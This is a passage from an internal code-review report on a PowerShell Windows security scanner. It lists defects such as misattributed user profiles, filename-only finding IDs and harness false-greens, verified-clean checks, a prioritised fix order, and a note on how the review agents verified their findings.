  `Phases-3.ps1:263/299/565/647/895/1090/1202/1482/1663/1904`. `C:\Users\bob` prefixes
  `C:\Users\bob.CORP\…`; longest-match saves it only when both profiles are in the map. Misattributes
  the user in a finding's Description/Target (including CRITICAL+DeleteFile ones); IDs are path-hashed
  so nothing is dropped.
- **P6-23 · Phase 101 WSL** (`Phases-3.ps1:1543`) runs `wsl.exe --list` as the scan user, so it sees
  only the technician's distros (per-user, `HKCU\…\Lxss`) and carries **no scope note**, unlike Phase 65
  and the cert store, both of which documented their deliberate single-user limit. INFO-only.
- **P6-24 · Phase 74.5 identity key** (`Phases-2.ps1:1198`) correctly collapses the `Content.Outlook`
  junction alias (verified: `Convert-Path` does not resolve junctions; `Get-ScanFiles` skips reparse
  points only on *sub*directories). Residual is the inverse — two genuinely distinct byte-identical
  copies with equal mtime collapse to one finding, leaving the second on disk at HIGH+Quarantine. NTFS
  file ID would be the true discriminator.
- **P6-25 · Residual filename-only IDs outside hive loops** (pre-existing, migration-adjacent):
  `Phases-3.ps1:1030/1034` `SPOOLDRV_` over a `-Recurse` spool-driver walk at **HIGH + DeleteFile**;
  `:1699/1707/1726` `HIDDENTASK_`/`SDDLTASK_`/`COMHANDLERTASK_`; `Phases-1.ps1:1263` `ADS_` omits the
  stream name (two streams on one file → one finding, FixParam removes only the first);
  `Phases-2.ps1:2366` `RECYCLE_`; `:2381` `GPOSCRIPT_`.

### P1 migration — verified CLEAN

- **Variable shadowing — CLEAN, all files.** Mechanical case-insensitive grep for assignment or
  `foreach` binding of every loader `param()` name (`$auto, $mode, $hours, $html, $baseline, $schedule,
  $stealth, $paranoid, $outdir, $iocfile, $phases, $loadUserHives, $smtp*`) across all three modules:
  **zero hits**; only reads. `Summary.ps1:198`'s `$html = @"` is function-local inside
  `Write-HtmlReport`. All new locals use the `$zb*` convention. **No nested and no leaked `$zbHive`.**
- **`,$arr` / bare-index — CLEAN.** All **60** `Get-UserHives` call sites use `@(Get-UserHives)` or
  `@(@(Get-UserHives) | Sort-Object Sid)`; no `(Get-UserHives)[0]`, no bare `foreach`. Every
  `Get-ScanFiles` result is paren-wrapped or assigned first — no direct `Get-ScanFiles | …` anywhere.
  `Get-ZbUserRootsM1` returns a plain array and every caller wraps in `@()`. **No `$budget /
  @(...).Count` division exists anywhere — the documented spec bug did not land.**
- **Finding-ID uniqueness inside hive loops — clean except P1-5.** Every `-ID` reachable from each of the
  **57** hive loops carries `$zbHive.Sid`, an attributed `$zb*Sid`, or a full-path hash that is per-user
  by construction. The Phases-3 claim of "9 previously filename-only IDs, now fixed" is **verified true,
  and the real count is 14**. `Get-StableId` is FNV-1a, deterministic cross-process — correct per the rule.
- **Junction / alias double-counting — CLEAN in its documented form.** `Get-UserPaths` never emits the
  legacy junction names (`Local Settings`, `Application Data`, `My Documents`, `Temporary Internet
  Files`). `Get-ScanFiles` skips `ReparsePoint` directories during traversal. The one real junction pair
  is handled correctly by the identity-keyed ID. Where roots merely *nest*, `FullName` is identical so
  `Add-Finding` de-dupes — the cost is wasted budget (P6-18), not a second destructive action.
- **Server-side P1 guards — correct and properly mirrored.** `Test-ProtectedTarget` (`:455/464`) and its
  runspace twin `Test-RProtected` (`:1576/1577/1582-1592`) both hard-block service hives and
  `ZB_UH_*`/`ZB_UC_*` mounts, with the "user logged off since the scan" check deliberately and correctly
  only in the runspace copy. Regexes tolerate the provider-qualified
  `Microsoft.PowerShell.Core\Registry::` prefix; `Phases-1.ps1:1618` normalises FixParams to match.
- **Phases 108-115** (`$PhasePlan.Integrity`) are machine-scope and untouched — no P1 exposure.

---

## Suggested fix order

0. **P1-1** — scale/signal the `Get-ScanFiles` budget. Single highest-leverage fix in this document:
   without it the filesystem half of P1 does not cover more than one profile, and P1-1, P1-9, P1-10,
   P6-18 and P6-19 are all the same defect.
1. **P0 (R1-1, R1-2, R1-3) + P1-2, P1-3, P1-4** — rule-#1 violations. These damage client machines.
   R1-1 needs a design decision before coding.
2. **AVAIL-1, AVAIL-3, P1-6** — a permanent tool lockout, an unprompted host-wide VM kill, and a
   console-remediation path that leaves other users' hives mounted (TEMPORARY PROFILE outage at their
   next logon). All small fixes, all user-visible damage.
3. **P4 (TEST-1…TEST-5)** — make the harness capable of failing **before** relying on it to validate
   anything else. TEST-2, TEST-3, TEST-4 and the `>>` fix in TEST-7 are 1–2 lines each and close every
   false-green path. **Everything below this line should be validated by the repaired harness.**
4. **False all-clears: FC-1…FC-5, P1-7, P1-10, P1-11, P6-19.** FC-1 and FC-2/FC-3 share a root cause —
   the category→phase map was built without modelling the mode gate or checking which phases consume
   IOCs. P1-7 and FC-4 are the same class on two different paths.
5. **Detection regressions: REG-1, REG-2, P1-9, P1-5.** REG-1 affects every scan, not just custom ones.
6. **P1-12** — expose `-LoadUserHives` in the GUI, or stop advising operators to use a flag the primary
   entry point cannot pass.
7. **AVAIL-2, AVAIL-4**, then **P5**, then the P6 medium/low tail.

Re-grade the healthy-box auto-destructive baseline (currently **8** DEEP `-LoadUserHives` / **2**
QUICK) after each group. **Note that baseline is single-box and 2-profile — P1-2, P1-3, P1-4 and P6-15
are all invisible to it by construction.** A multi-profile grading box (or a synthetic profile set) is
needed before the rule-#1 fixes can be called verified.

---

## Method note — why static review found these and the tests did not

Seven agents, partitioned by file ownership, each given CLAUDE.md's CRITICAL RULES as the standard and
instructed to verify by reading code rather than trusting comments or CHANGELOG claims. Several
findings were confirmed by *measurement* on live PS 5.1 rather than by reasoning: the 74 ms
`BeginInvoke` window (AVAIL-2), the `GetFileName` throw table (AVAIL-1), the trap-granularity
before/after trace (REG-1), the `cmd` `>>` redirect-handle behaviour (TEST-7), the 3.4 s O(n²) dedupe
(AVAIL-4), and the 23-payload injection matrix (clean).

This mirrors CLAUDE.md's existing lesson — *"live grading and 3 audit agents caught what static
reasoning missed"* — with the complement now also true: **static review caught what a
structurally-unfailable test suite could not.** Both are needed.
